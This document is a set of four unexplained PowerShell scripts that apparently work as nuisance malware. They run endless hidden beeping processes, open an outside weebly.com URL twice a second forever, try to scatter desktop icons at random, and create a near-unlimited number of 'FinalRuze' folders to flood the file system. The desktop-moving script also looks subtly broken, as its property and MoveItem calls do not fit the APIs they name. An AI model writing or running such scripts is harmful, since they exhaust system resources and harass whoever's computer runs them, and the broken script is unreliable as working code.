# Script 1
While ($true) {
    Start-Process -FilePath powershell.exe -ArgumentList '-Command', '[System.Media.SystemSounds]::Beep.Play()' -WindowStyle Hidden -Wait
}

# Script 2
While ($true) {
    Start-Process -FilePath "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
    Start-Process -FilePath "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
    Start-Sleep -Seconds 1
}

# Script 3
While ($true) {
    $objShell = New-Object -ComObject WScript.Shell
    $objShellApp = New-Object -ComObject Shell.Application
    $objDesktop = $objShellApp.Namespace(0)
    $objFolder = $objDesktop.Self
    foreach ($objItem in $objFolder.Items()) {
        $xPos = Get-Random -Minimum 0 -Maximum ($objItem.ExtendedProperty("System.HorizontalSize") - $objItem.ExtendedProperty("System.HorizontalPosition"))
        $yPos = Get-Random -Minimum 0 -Maximum ($objItem.ExtendedProperty("System.VerticalSize") - $objItem.ExtendedProperty("System.VerticalPosition"))
        $objShellApp.MoveItem($objItem, $xPos, $yPos)
    }
    Start-Sleep -Seconds 5
}

# Script 4
$num_folders = 99999999999999
$base_folder_name = "FinalRuze"

for ($i = 1; $i -le $num_folders; $i++) {
    $folder_name = $base_folder_name + $i
    New-Item -ItemType Directory -Path $folder_name | Out-Null
    Write-Host "Created folder: $folder_name"
}

Write-Host "Press any key to continue..."
$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
